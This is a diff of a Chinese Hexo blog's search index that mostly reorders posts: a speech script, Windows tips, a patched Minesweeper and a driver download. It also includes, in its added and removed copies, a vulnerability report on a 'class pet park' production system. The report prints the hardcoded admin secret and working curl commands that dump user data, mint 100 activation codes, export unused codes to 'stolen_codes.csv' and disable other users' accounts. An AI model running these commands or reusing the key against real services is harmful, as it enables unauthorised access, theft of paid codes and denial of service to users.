@@ -1,16 +1,40 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>谷歌小恐龙</title>
-    <url>/20250320/Chrome_Dino/</url>
-    <content><![CDATA[<p>体验：</p>
+    <title>本站说明</title>
+    <url>/20250408/Mirror/</url>
+    <content><![CDATA[<p>本站主站： <a href="https://zxclf.us.ci/">https://zxclf.us.ci/</a> (使用 Cloudflare 搭建)</p>
+<p>本站镜像站： <a href="https://zxclf.github.io/">https://zxclf.github.io/</a> (使用 Github Pages 搭建)</p>
+<p>本站开源地址：<a href="https://github.com/ZXCLF/ZXCLF.github.io">https://github.com/ZXCLF/ZXCLF.github.io</a></p>
+<p><span class="heimu" title="你知道的太多了">本站由 Hexo 与玄学驱动</span></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>班级宠物乐园系统漏洞报告</title>
+    <url>/20260401/Report/</url>
+    <content><![CDATA[<h1 id="班级宠物乐园系统漏洞报告"><a href="#班级宠物乐园系统漏洞报告" class="headerlink" title="班级宠物乐园系统漏洞报告"></a>班级宠物乐园系统漏洞报告</h1><p><strong>测试对象</strong>: 生产环境 (<a href="http://43.138.xxx.xx/pet/">http://43.138.xxx.xx/pet/</a>) （数据已脱敏） </p>
 <span id="more"></span>
 
-<p>(按空格键开始)</p>
-<iframe id="ifrm"  width="80%" height="600px"
- frameborder="0" src="https://zxclf.github.io/Chrome_Dino/Chrome_Dino" marginwidth="0" marginheight="0" vspace="0" 
- hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true">
-</iframe>]]></content>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>系统在前端代码中硬编码了管理员后台的访问密钥，<strong>任何用户都可以通过查看网页源代码获取该密钥!!! ∑(ﾟДﾟノ)ノ</strong></p>
+<h4 id="漏洞代码位置"><a href="#漏洞代码位置" class="headerlink" title="漏洞代码位置"></a>漏洞代码位置</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Yx</span> = <span class="string">&quot;petclass_admin_2024&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> xn = &#123;<span class="string">&quot;X-Admin-Secret&quot;</span>: <span class="title class_">Yx</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h4><p><strong>获取管理员密钥</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">const Yx = <span class="string">&quot;petclass_admin_2024&quot;</span>;</span><br><span class="line">const xn = &#123;<span class="string">&quot;X-Admin-Secret&quot;</span>: Yx&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用密钥调用管理接口</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取所有用户信息（包含用户名、账号类型、到期时间）</span></span><br><span class="line">curl -X GET http://43.138.xxx.xx:2016/api/admin/users \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>生成大量激活码</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成100个半年期激活码</span></span><br><span class="line">curl -X POST http://43.138.xxx.xx:2016/api/admin/generate-codes \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;count&quot;: 100, &quot;codeType&quot;: &quot;half_year&quot;&#125;&#x27;</span></span><br><span class="line">  &#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>导出所有未使用的激活码</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载所有可用激活码</span></span><br><span class="line">curl -X GET <span class="string">&quot;http://43.138.xxx.xx:2016/api/admin/codes/export?unused_only=true&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -o stolen_codes.csv</span><br></pre></td></tr></table></figure>
+
+<p><strong>禁用特定用户账号</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过禁用用户使用的激活码，使其账号失效</span></span><br><span class="line">curl -X POST http://43.138.xxx.xx:2016/api/admin/codes/disable \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;code&quot;: &quot;ABCD-1234-EFGH-5678&quot;&#125;&#x27;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p><em>本报告仅用于安全研究和漏洞修复目的，请勿用于非法用途。</em></p>
+]]></content>
   </entry>
   <entry>
     <title>作业管理器</title>
@@ -101,23 +125,6 @@
 <li><strong>保存进度</strong>：进度会自动保存到 <code>homework_progress.json</code></li>
 </ol>
 <h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>本项目采用 GPL 许可证。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>NoMoreBugCheck.sys数字签名版</title>
-    <url>/20250411/NoMoreBugCheck_sys/</url>
-    <content><![CDATA[<p>下载：<a href="https://www.123684.com/s/FGWpTd-4iQPh">123网盘</a></p>
-<p><strong>虽然数字签名已经过期，但可以正常加载驱动（不开测试模式）</strong></p>
-<p>亲测 Windows 11 24H2 可正常加载驱动（不开测试模式）</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>本站说明</title>
-    <url>/20250408/Mirror/</url>
-    <content><![CDATA[<p>本站主站： <a href="https://zxclf.us.ci/">https://zxclf.us.ci/</a> (使用 Cloudflare 搭建)</p>
-<p>本站镜像站： <a href="https://zxclf.github.io/">https://zxclf.github.io/</a> (使用 Github Pages 搭建)</p>
-<p>本站开源地址：<a href="https://github.com/ZXCLF/ZXCLF.github.io">https://github.com/ZXCLF/ZXCLF.github.io</a></p>
-<p><span class="heimu" title="你知道的太多了">本站由 Hexo 与玄学驱动</span></p>
 ]]></content>
   </entry>
   <entry>
@@ -492,62 +499,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>班级宠物乐园系统漏洞报告</title>
-    <url>/20260401/Report/</url>
-    <content><![CDATA[<h1 id="班级宠物乐园系统漏洞报告"><a href="#班级宠物乐园系统漏洞报告" class="headerlink" title="班级宠物乐园系统漏洞报告"></a>班级宠物乐园系统漏洞报告</h1><p><strong>测试对象</strong>: 生产环境 (<a href="http://43.138.xxx.xx/pet/">http://43.138.xxx.xx/pet/</a>) （数据已脱敏） </p>
-<span id="more"></span>
-
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>系统在前端代码中硬编码了管理员后台的访问密钥，<strong>任何用户都可以通过查看网页源代码获取该密钥!!! ∑(ﾟДﾟノ)ノ</strong></p>
-<h4 id="漏洞代码位置"><a href="#漏洞代码位置" class="headerlink" title="漏洞代码位置"></a>漏洞代码位置</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Yx</span> = <span class="string">&quot;petclass_admin_2024&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> xn = &#123;<span class="string">&quot;X-Admin-Secret&quot;</span>: <span class="title class_">Yx</span>&#125;;</span><br></pre></td></tr></table></figure>
-
-<h4 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h4><p><strong>获取管理员密钥</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">const Yx = <span class="string">&quot;petclass_admin_2024&quot;</span>;</span><br><span class="line">const xn = &#123;<span class="string">&quot;X-Admin-Secret&quot;</span>: Yx&#125;;</span><br></pre></td></tr></table></figure>
-
-<p><strong>利用密钥调用管理接口</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取所有用户信息（包含用户名、账号类型、到期时间）</span></span><br><span class="line">curl -X GET http://43.138.xxx.xx:2016/api/admin/users \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>生成大量激活码</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成100个半年期激活码</span></span><br><span class="line">curl -X POST http://43.138.xxx.xx:2016/api/admin/generate-codes \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;count&quot;: 100, &quot;codeType&quot;: &quot;half_year&quot;&#125;&#x27;</span></span><br><span class="line">  &#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>导出所有未使用的激活码</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载所有可用激活码</span></span><br><span class="line">curl -X GET <span class="string">&quot;http://43.138.xxx.xx:2016/api/admin/codes/export?unused_only=true&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -o stolen_codes.csv</span><br></pre></td></tr></table></figure>
-
-<p><strong>禁用特定用户账号</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过禁用用户使用的激活码，使其账号失效</span></span><br><span class="line">curl -X POST http://43.138.xxx.xx:2016/api/admin/codes/disable \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;code&quot;: &quot;ABCD-1234-EFGH-5678&quot;&#125;&#x27;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
-<p><em>本报告仅用于安全研究和漏洞修复目的，请勿用于非法用途。</em></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>好玩的文字特效</title>
-    <url>/20250324/Text/</url>
-    <content><![CDATA[<p>测试：<a href="https://zxclf.github.io/Text">Text</a></p>
-<span id="more"></span>
-<iframe id="ifrm"  width="80%" height="600px"
- frameborder="0" src="https://zxclf.github.io/Text" marginwidth="0" marginheight="0" vspace="0" 
- hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true">
-</iframe>]]></content>
-  </entry>
-  <entry>
-    <title>演讲稿</title>
-    <url>/20250618/Speech/</url>
-    <content><![CDATA[<h3 id="在线预览"><a href="#在线预览" class="headerlink" title="在线预览"></a>在线预览</h3><p>尊敬的老师、亲爱的同学们：</p>
-<p>今天，我怀着无比崇敬的心情，向大家讲述一位用代码编织强国梦想、用算力托举民族脊梁的科学家——中国工程院院士郑纬民教授！</p>
-<p>他，是<strong>算力疆域的拓荒者</strong>。从奔跑在宁波石子路上的少年，到执掌清华计算机系统结构的巨匠，郑纬民院士用半个世纪的坚守，凿穿了存储技术的“冻土层”！他带领团队攻克<strong>存储系统的三大世界级难题</strong>，研制出中国首个自主知识产权的<strong>高可扩展海量存储网络系统TH-MSNS</strong>。其独创的“<strong>社区共享架构</strong>”，如同在数据的星空间架起虹桥，让“存储一份、全网共享”的云时代提前降临神州！</p>
-<p>他，是<strong>超算巅峰的登顶人</strong>。2016年，戈登·贝尔奖——这座全球超算领域的“奥林匹克圣火”——首次被中国点燃！郑纬民团队在“神威·太湖之光”上运行<strong>高可扩展非线性地震模拟工具</strong>，以万亿级精度“回放”唐山大地震的震撼瞬间。当世界惊叹于东方算力的喷薄时，他再度折桂2017年戈登·贝尔奖，让中国超算的双翼在人类科学的天穹留下永恒航迹！</p>
-<p>他，更是<strong>知识星河的摆渡者</strong>，年近八旬，白发如雪，却化身“银发知播”，在B站的数字原野上开垦出<strong>17万粉丝的科普绿洲</strong>。从<strong>区块链的密码迷宫</strong>到<strong>元宇宙的虚拟奇点</strong>，从<strong>AI芯片的纳米战场</strong>到<strong>大模型训练的万亿参数矩阵</strong>——晦涩的术语在他口中化作汩汩清泉，浇灌着千万青年的科技梦想！</p>
-<p>当他说“<strong>算力就是生产力</strong>”，当他在常州呼吁抓住“<strong>大模型+</strong>”的历史机遇，我们听见的不仅是院士的箴言，更是一位古稀智者对民族未来的炽热呐喊！ 他少年时踏过的石子路，已延伸为中国存储技术跃居世界之巅的<strong>光量子通道</strong>；他实验室里跳动的二进制火花，正点燃<strong>人工智能时代的核聚变</strong>！</p>
-<p>让我们向这位感动中国的“<strong>云端筑梦师</strong>”致敬！因为他，我们相信：<strong>每一行代码都能书写国魂，每一瓦算力必将照亮复兴！</strong></p>
-<p>我的演讲完毕，谢谢大家！</p>
-<h3 id="下载方式"><a href="#下载方式" class="headerlink" title="下载方式"></a>下载方式</h3><p><strong>建议通过 <a href="https://github.com/ZXCLF/My_PPT/releases/tag/v1.0">Github Release</a> 下载（若国内下载速度较慢可使用123云盘下载）</strong></p>
-<h3 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h3><ul>
-<li><strong>PPT__Release.pptx</strong>：演讲时使用的演示文稿  </li>
-<li><strong>Speech_Manuscript.docx</strong>：演讲稿全文</li>
-</ul>
-<p><strong>国内下载链接</strong>：<br><a href="https://www.123pan.com/s/FGWpTd-ptEPh">123云盘下载</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>Ventoy Arch To Go 安装指南</title>
     <url>/20250809/Ventoy_Arch_To_Go/</url>
     <content><![CDATA[<h1 id="Ventoy-Arch-To-Go-安装指南"><a href="#Ventoy-Arch-To-Go-安装指南" class="headerlink" title="Ventoy Arch To Go 安装指南"></a><strong>Ventoy</strong> Arch To Go 安装指南</h1><blockquote>
@@ -860,6 +811,59 @@
 ]]></content>
   </entry>
   <entry>
+    <title>演讲稿</title>
+    <url>/20250618/Speech/</url>
+    <content><![CDATA[<h3 id="在线预览"><a href="#在线预览" class="headerlink" title="在线预览"></a>在线预览</h3><p>尊敬的老师、亲爱的同学们：</p>
+<p>今天，我怀着无比崇敬的心情，向大家讲述一位用代码编织强国梦想、用算力托举民族脊梁的科学家——中国工程院院士郑纬民教授！</p>
+<p>他，是<strong>算力疆域的拓荒者</strong>。从奔跑在宁波石子路上的少年，到执掌清华计算机系统结构的巨匠，郑纬民院士用半个世纪的坚守，凿穿了存储技术的“冻土层”！他带领团队攻克<strong>存储系统的三大世界级难题</strong>，研制出中国首个自主知识产权的<strong>高可扩展海量存储网络系统TH-MSNS</strong>。其独创的“<strong>社区共享架构</strong>”，如同在数据的星空间架起虹桥，让“存储一份、全网共享”的云时代提前降临神州！</p>
+<p>他，是<strong>超算巅峰的登顶人</strong>。2016年，戈登·贝尔奖——这座全球超算领域的“奥林匹克圣火”——首次被中国点燃！郑纬民团队在“神威·太湖之光”上运行<strong>高可扩展非线性地震模拟工具</strong>，以万亿级精度“回放”唐山大地震的震撼瞬间。当世界惊叹于东方算力的喷薄时，他再度折桂2017年戈登·贝尔奖，让中国超算的双翼在人类科学的天穹留下永恒航迹！</p>
+<p>他，更是<strong>知识星河的摆渡者</strong>，年近八旬，白发如雪，却化身“银发知播”，在B站的数字原野上开垦出<strong>17万粉丝的科普绿洲</strong>。从<strong>区块链的密码迷宫</strong>到<strong>元宇宙的虚拟奇点</strong>，从<strong>AI芯片的纳米战场</strong>到<strong>大模型训练的万亿参数矩阵</strong>——晦涩的术语在他口中化作汩汩清泉，浇灌着千万青年的科技梦想！</p>
+<p>当他说“<strong>算力就是生产力</strong>”，当他在常州呼吁抓住“<strong>大模型+</strong>”的历史机遇，我们听见的不仅是院士的箴言，更是一位古稀智者对民族未来的炽热呐喊！ 他少年时踏过的石子路，已延伸为中国存储技术跃居世界之巅的<strong>光量子通道</strong>；他实验室里跳动的二进制火花，正点燃<strong>人工智能时代的核聚变</strong>！</p>
+<p>让我们向这位感动中国的“<strong>云端筑梦师</strong>”致敬！因为他，我们相信：<strong>每一行代码都能书写国魂，每一瓦算力必将照亮复兴！</strong></p>
+<p>我的演讲完毕，谢谢大家！</p>
+<h3 id="下载方式"><a href="#下载方式" class="headerlink" title="下载方式"></a>下载方式</h3><p><strong>建议通过 <a href="https://github.com/ZXCLF/My_PPT/releases/tag/v1.0">Github Release</a> 下载（若国内下载速度较慢可使用123云盘下载）</strong></p>
+<h3 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h3><ul>
+<li><strong>PPT__Release.pptx</strong>：演讲时使用的演示文稿  </li>
+<li><strong>Speech_Manuscript.docx</strong>：演讲稿全文</li>
+</ul>
+<p><strong>国内下载链接</strong>：<br><a href="https://www.123pan.com/s/FGWpTd-ptEPh">123云盘下载</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>扫雷破解版</title>
+    <url>/20250504/Minesweeper_Patched/</url>
+    <content><![CDATA[<p>我对经典的扫雷游戏进行了一点修改，现在可以一键显示所有地雷的位置，并轻松实现一键通关！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZXCLF/blog_pic/pic1.png" alt="pic1"></p>
+<p>下载： <a href="https://www.123684.com/s/FGWpTd-I4EPh">https://www.123684.com/s/FGWpTd-I4EPh</a></p>
+<h3 id="适用系统："><a href="#适用系统：" class="headerlink" title="适用系统："></a>适用系统：</h3><p>适用于Windows 7及以上的操作系统。</p>
+<h3 id="文件说明："><a href="#文件说明：" class="headerlink" title="文件说明："></a>文件说明：</h3><ul>
+<li>Minesweeper文件夹：原版扫雷游戏。</li>
+<li>Minesweeper_Patched文件夹：破解的扫雷游戏。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NoMoreBugCheck.sys数字签名版</title>
+    <url>/20250411/NoMoreBugCheck_sys/</url>
+    <content><![CDATA[<p>下载：<a href="https://www.123684.com/s/FGWpTd-4iQPh">123网盘</a></p>
+<p><strong>虽然数字签名已经过期，但可以正常加载驱动（不开测试模式）</strong></p>
+<p>亲测 Windows 11 24H2 可正常加载驱动（不开测试模式）</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>好玩的文字特效</title>
+    <url>/20250324/Text/</url>
+    <content><![CDATA[<p>测试：<a href="https://zxclf.github.io/Text">Text</a></p>
+<span id="more"></span>
+<iframe id="ifrm"  width="80%" height="600px"
+ frameborder="0" src="https://zxclf.github.io/Text" marginwidth="0" marginheight="0" vspace="0" 
+ hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true">
+</iframe>]]></content>
+  </entry>
+  <entry>
     <title>部署UWP应用为系统预装应用</title>
     <url>/20250322/UWP_Setup/</url>
     <content><![CDATA[<p><strong>要将UWP应用部署为系统预装应用，可以使用DISM工具或使用Add-AppxProvisionedPackage命令</strong></p>
@@ -901,37 +905,16 @@
       </tags>
   </entry>
   <entry>
-    <title>【最新】在Win8.x上安装第三方Metro应用</title>
-    <url>/20250125/Win8.x_Metro/</url>
-    <content><![CDATA[<p><strong>注意:</strong></p>
-<p><strong>1.本教程适用于Windows8.1 (build 9600)</strong></p>
-<p><strong>2.折腾有风险，使用本方法可能会产生未知问题，本人概不负责。</strong></p>
+    <title>谷歌小恐龙</title>
+    <url>/20250320/Chrome_Dino/</url>
+    <content><![CDATA[<p>体验：</p>
 <span id="more"></span>
 
-<p>工具下载：<br>123网盘：<a href="https://www.123684.com/s/FGWpTd-Yl9Ph">主链接</a> <a href="https://www.123865.com/s/FGWpTd-Yl9Ph">备用链接</a> (无提取码)</p>
-<p>百度网盘：<a href="https://pan.baidu.com/s/1tfaa44r__aq4FnojJWBUuA?pwd=ZXCL">https://pan.baidu.com/s/1tfaa44r__aq4FnojJWBUuA?pwd&#x3D;ZXCL</a> 提取码: ZXCL</p>
-<p>使用方法:</p>
-<p>下载并解压工具，然后在确保计算机有互联网连接的情况下运行install.bat(弹出的提示可以点击确定或直接关闭)，待脚本运行完成后即可安装APPX。</p>
-]]></content>
-      <tags>
-        <tag>Metro</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>扫雷破解版</title>
-    <url>/20250504/Minesweeper_Patched/</url>
-    <content><![CDATA[<p>我对经典的扫雷游戏进行了一点修改，现在可以一键显示所有地雷的位置，并轻松实现一键通关！</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ZXCLF/blog_pic/pic1.png" alt="pic1"></p>
-<p>下载： <a href="https://www.123684.com/s/FGWpTd-I4EPh">https://www.123684.com/s/FGWpTd-I4EPh</a></p>
-<h3 id="适用系统："><a href="#适用系统：" class="headerlink" title="适用系统："></a>适用系统：</h3><p>适用于Windows 7及以上的操作系统。</p>
-<h3 id="文件说明："><a href="#文件说明：" class="headerlink" title="文件说明："></a>文件说明：</h3><ul>
-<li>Minesweeper文件夹：原版扫雷游戏。</li>
-<li>Minesweeper_Patched文件夹：破解的扫雷游戏。</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>破解</tag>
-      </tags>
+<p>(按空格键开始)</p>
+<iframe id="ifrm"  width="80%" height="600px"
+ frameborder="0" src="https://zxclf.github.io/Chrome_Dino/Chrome_Dino" marginwidth="0" marginheight="0" vspace="0" 
+ hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true">
+</iframe>]]></content>
   </entry>
   <entry>
     <title>Win 8.1 x64 集成补丁镜像</title>
@@ -948,6 +931,23 @@
 ]]></content>
       <tags>
         <tag>Win 8.1</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【最新】在Win8.x上安装第三方Metro应用</title>
+    <url>/20250125/Win8.x_Metro/</url>
+    <content><![CDATA[<p><strong>注意:</strong></p>
+<p><strong>1.本教程适用于Windows8.1 (build 9600)</strong></p>
+<p><strong>2.折腾有风险，使用本方法可能会产生未知问题，本人概不负责。</strong></p>
+<span id="more"></span>
+
+<p>工具下载：<br>123网盘：<a href="https://www.123684.com/s/FGWpTd-Yl9Ph">主链接</a> <a href="https://www.123865.com/s/FGWpTd-Yl9Ph">备用链接</a> (无提取码)</p>
+<p>百度网盘：<a href="https://pan.baidu.com/s/1tfaa44r__aq4FnojJWBUuA?pwd=ZXCL">https://pan.baidu.com/s/1tfaa44r__aq4FnojJWBUuA?pwd&#x3D;ZXCL</a> 提取码: ZXCL</p>
+<p>使用方法:</p>
+<p>下载并解压工具，然后在确保计算机有互联网连接的情况下运行install.bat(弹出的提示可以点击确定或直接关闭)，待脚本运行完成后即可安装APPX。</p>
+]]></content>
+      <tags>
+        <tag>Metro</tag>
       </tags>
   </entry>
   <entry>
